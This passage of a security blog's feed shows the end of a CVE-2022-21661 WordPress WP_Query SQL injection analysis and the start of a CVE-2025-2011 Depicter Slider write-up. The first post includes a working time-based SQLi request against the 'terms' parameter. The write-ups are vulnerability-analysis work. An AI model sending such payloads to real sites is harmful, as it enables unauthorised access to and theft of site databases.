class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack1.png&#34; title=&#34;WP_Query object created&#34; data-thumbnail=&#34;/posts/2025-10-01-cve-2022-21661/callstack1.png&#34; data-sub-html=&#34;&lt;h2&gt;callstack 1&lt;/h2&gt;&lt;p&gt;WP_Query object created&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack1.png&#39; alt=&#34;callstack 1&#34; height=&#34;352&#34; width=&#34;1283&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;WP_Query object created&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack2.png&#34; title=&#34;WP_Query constructor called&#34; data-thumbnail=&#34;/posts/2025-10-01-cve-2022-21661/callstack2.png&#34; data-sub-html=&#34;&lt;h2&gt;callstack 2&lt;/h2&gt;&lt;p&gt;WP_Query constructor called&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack2.png&#39; alt=&#34;callstack 2&#34; height=&#34;165&#34; width=&#34;1249&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;WP_Query constructor called&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack3.png&#34; title=&#34;get_posts invoked to run query&#34; data-thumbnail=&#34;/posts/2025-10-01-cve-2022-21661/callstack3.png&#34; data-sub-html=&#34;&lt;h2&gt;callstack 3&lt;/h2&gt;&lt;p&gt;get_posts invoked to run query&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack3.png&#39; alt=&#34;callstack 3&#34; height=&#34;205&#34; width=&#34;1398&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;get_posts invoked to run query&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack4.png&#34; title=&#34;Condition satisfied, get_sql called&#34; data-thumbnail=&#34;/posts/2025-10-01-cve-2022-21661/callstack4.png&#34; data-sub-html=&#34;&lt;h2&gt;callstack 4&lt;/h2&gt;&lt;p&gt;Condition satisfied, get_sql called&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack4.png&#39; alt=&#34;callstack 4&#34; height=&#34;319&#34; width=&#34;1476&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Condition satisfied, get_sql called&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack5.png&#34; title=&#34;get_sql returns get_sql_clauses&#34; data-thumbnail=&#34;/posts/2025-10-01-cve-2022-21661/callstack5.png&#34; data-sub-html=&#34;&lt;h2&gt;callstack 5&lt;/h2&gt;&lt;p&gt;get_sql returns get_sql_clauses&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack5.png&#39; alt=&#34;callstack 5&#34; height=&#34;165&#34; width=&#34;1652&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;get_sql returns get_sql_clauses&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack6.png&#34; title=&#34;get_sql_clauses calls get_sql_for_query&#34; data-thumbnail=&#34;/posts/2025-10-01-cve-2022-21661/callstack6.png&#34; data-sub-html=&#34;&lt;h2&gt;callstack 6&lt;/h2&gt;&lt;p&gt;get_sql_clauses calls get_sql_for_query&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack6.png&#39; alt=&#34;callstack 6&#34; height=&#34;296&#34; width=&#34;1302&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;get_sql_clauses calls get_sql_for_query&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack8.png&#34; title=&#34;Iterate query array in get_sql_for_query&#34; data-thumbnail=&#34;/posts/2025-10-01-cve-2022-21661/callstack8.png&#34; data-sub-html=&#34;&lt;h2&gt;callstack 8&lt;/h2&gt;&lt;p&gt;Iterate query array in get_sql_for_query&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack8.png&#39; alt=&#34;callstack 8&#34; height=&#34;352&#34; width=&#34;1452&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Iterate query array in get_sql_for_query&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack15.png&#34; title=&#34;Checks terms, taxonomy, operator keys...&#34; data-thumbnail=&#34;/posts/2025-10-01-cve-2022-21661/callstack15.png&#34; data-sub-html=&#34;&lt;h2&gt;callstack 15&lt;/h2&gt;&lt;p&gt;Checks terms, taxonomy, operator keys...&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack15.png&#39; alt=&#34;callstack 15&#34; height=&#34;223&#34; width=&#34;858&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Checks terms, taxonomy, operator keys...&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack7.png&#34; title=&#34;Calls get_sql_for_clause&#34; data-thumbnail=&#34;/posts/2025-10-01-cve-2022-21661/callstack7.png&#34; data-sub-html=&#34;&lt;h2&gt;callstack 7&lt;/h2&gt;&lt;p&gt;Calls get_sql_for_clause&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack7.png&#39; alt=&#34;callstack 7&#34; height=&#34;345&#34; width=&#34;1356&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Calls get_sql_for_clause&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack9.png&#34; title=&#34;Bypass clean_query, payload preserved&#34; data-thumbnail=&#34;/posts/2025-10-01-cve-2022-21661/callstack9.png&#34; data-sub-html=&#34;&lt;h2&gt;callstack 9&lt;/h2&gt;&lt;p&gt;Bypass clean_query, payload preserved&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack9.png&#39; alt=&#34;callstack 9&#34; height=&#34;853&#34; width=&#34;1483&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Bypass clean_query, payload preserved&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack10.png&#34; title=&#34;Payload assigned to $sql\[&amp;#39;where&amp;#39;]&#34; data-thumbnail=&#34;/posts/2025-10-01-cve-2022-21661/callstack10.png&#34; data-sub-html=&#34;&lt;h2&gt;callstack 10&lt;/h2&gt;&lt;p&gt;Payload assigned to $sql\[&amp;#39;where&amp;#39;]&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack10.png&#39; alt=&#34;callstack 10&#34; height=&#34;465&#34; width=&#34;1220&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Payload assigned to $sql\[&#39;where&#39;]&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack11.png&#34; title=&#34;Parentheses added to WHERE clause&#34; data-thumbnail=&#34;/posts/2025-10-01-cve-2022-21661/callstack11.png&#34; data-sub-html=&#34;&lt;h2&gt;callstack 11&lt;/h2&gt;&lt;p&gt;Parentheses added to WHERE clause&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack11.png&#39; alt=&#34;callstack 11&#34; height=&#34;364&#34; width=&#34;1545&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Parentheses added to WHERE clause&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack16.png&#34; title=&#34;Adds AND and returns SQL&#34; data-thumbnail=&#34;/posts/2025-10-01-cve-2022-21661/callstack16.png&#34; data-sub-html=&#34;&lt;h2&gt;callstack 16&lt;/h2&gt;&lt;p&gt;Adds AND and returns SQL&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack16.png&#39; alt=&#34;callstack 16&#34; height=&#34;305&#34; width=&#34;1265&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Adds AND and returns SQL&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack14.png&#34; title=&#34;get_posts receives SQL&#34; data-thumbnail=&#34;/posts/2025-10-01-cve-2022-21661/callstack14.png&#34; data-sub-html=&#34;&lt;h2&gt;callstack 14&lt;/h2&gt;&lt;p&gt;get_posts receives SQL&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack14.png&#39; alt=&#34;callstack 14&#34; height=&#34;196&#34; width=&#34;1228&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;get_posts receives SQL&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack12.png&#34; title=&#34;Payload merged into $clauses\[&amp;#39;where&amp;#39;]&#34; data-thumbnail=&#34;/posts/2025-10-01-cve-2022-21661/callstack12.png&#34; data-sub-html=&#34;&lt;h2&gt;callstack 12&lt;/h2&gt;&lt;p&gt;Payload merged into $clauses\[&amp;#39;where&amp;#39;]&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack12.png&#39; alt=&#34;callstack 12&#34; height=&#34;282&#34; width=&#34;1262&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Payload merged into $clauses\[&#39;where&#39;]&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack13.png&#34; title=&#34;Observe last_query where SQL executes&#34; data-thumbnail=&#34;/posts/2025-10-01-cve-2022-21661/callstack13.png&#34; data-sub-html=&#34;&lt;h2&gt;callstack 13&lt;/h2&gt;&lt;p&gt;Observe last_query where SQL executes&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack13.png&#39; alt=&#34;callstack 13&#34; height=&#34;804&#34; width=&#34;1520&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Observe last_query where SQL executes&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Execution Flow Diagram&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/chart.png&#34; title=&#34;Execution flow of WP_Query leading to SQLi&#34; data-thumbnail=&#34;/posts/2025-10-01-cve-2022-21661/chart.png&#34; data-sub-html=&#34;&lt;h2&gt;chart&lt;/h2&gt;&lt;p&gt;Execution flow of WP_Query leading to SQLi&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-01-cve-2022-21661/chart.png&#39; alt=&#34;chart&#34; height=&#34;1094&#34; width=&#34;2451&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Execution flow of WP_Query leading to SQLi&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Replace &lt;code&gt;terms&lt;/code&gt; value with an SQLi payload:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /demo/?terms=1)&amp;#43;AND&amp;#43;(SELECT&amp;#43;1&amp;#43;FROM&amp;#43;(SELECT&amp;#43;SLEEP(5))a)&amp;#43;%23&amp;#43; HTTP/1.1&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/detect.png&#34; title=&#34;Response shows delay caused by payload execution&#34; data-thumbnail=&#34;/posts/2025-10-01-cve-2022-21661/detect.png&#34; data-sub-html=&#34;&lt;h2&gt;Detect&lt;/h2&gt;&lt;p&gt;Response shows delay caused by payload execution&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-01-cve-2022-21661/detect.png&#39; alt=&#34;Detect&#34; height=&#34;267&#34; width=&#34;433&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Response shows delay caused by payload execution&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;CVE-2022-21661&lt;/strong&gt; vulnerability in &lt;strong&gt;WordPress Core&lt;/strong&gt;, prior to version &lt;strong&gt;5.8.3&lt;/strong&gt; (affecting versions back to &lt;strong&gt;3.7.37&lt;/strong&gt;), stems from improper &lt;strong&gt;sanitization&lt;/strong&gt; in &lt;code&gt;WP_Query&lt;/code&gt;, leading to a potential SQL Injection vulnerability.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/sql-injection/cheat-sheet&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;SQL Injection cheat sheet - PortSwigger&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2022-21661&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2022-21661 Detail&lt;/a&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;notes&#34;&gt;&lt;span&gt;Notes&lt;/span&gt;&#xA;  &lt;a href=&#34;#notes&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;</description>
    </item>
    <item>
      <title>CVE-2025-2011 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-09-30-cve-2025-2011/</link>
      <pubDate>Tue, 30 Sep 2025 19:08:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-09-30-cve-2025-2011/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-09-30-cve-2025-2011/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;The vulnerability occurs in the &lt;strong&gt;Depicter Slider&lt;/strong&gt; WordPress plugin prior to version &lt;strong&gt;3.6.2&lt;/strong&gt;. This could allow an attacker to directly interact with your database, potentially leading to data theft or manipulation.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-2011&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-2011&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/depicter/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Depicter Slider Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: SQL Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.6.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Depicter Slider&lt;/strong&gt;: v3.6.1 (vulnerable) and v3.6.2 (patched)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt;: &lt;strong&gt;meld&lt;/strong&gt; or any other comparison tool to visualize differences between versions&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The root cause is that the application directly injects data from a &lt;strong&gt;GET&lt;/strong&gt; request into the SQL query without proper sanitization or escaping.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch Diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 